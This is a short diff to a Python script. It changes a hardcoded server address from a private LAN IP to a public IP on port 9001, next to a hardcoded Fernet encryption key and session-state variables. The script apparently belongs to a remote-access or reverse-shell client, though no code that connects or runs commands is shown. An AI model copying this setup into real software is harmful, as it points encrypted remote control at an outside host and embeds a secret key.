@@ -29,8 +29,8 @@ AES_KEY = b'jr8sI1WrJqL_5QyUe6j6H8V9g9vPKQO9v8lfdWpzhqk='
 cipher_suite = Fernet(AES_KEY)
 
 # Hardcoded Configuration
-SERVER_IP = "192.168.0.52"
-SERVER_PORT = 443
+SERVER_IP = "190.114.242.67"
+SERVER_PORT = 9001
 
 # Global session state
 current_directory = os.getcwd()
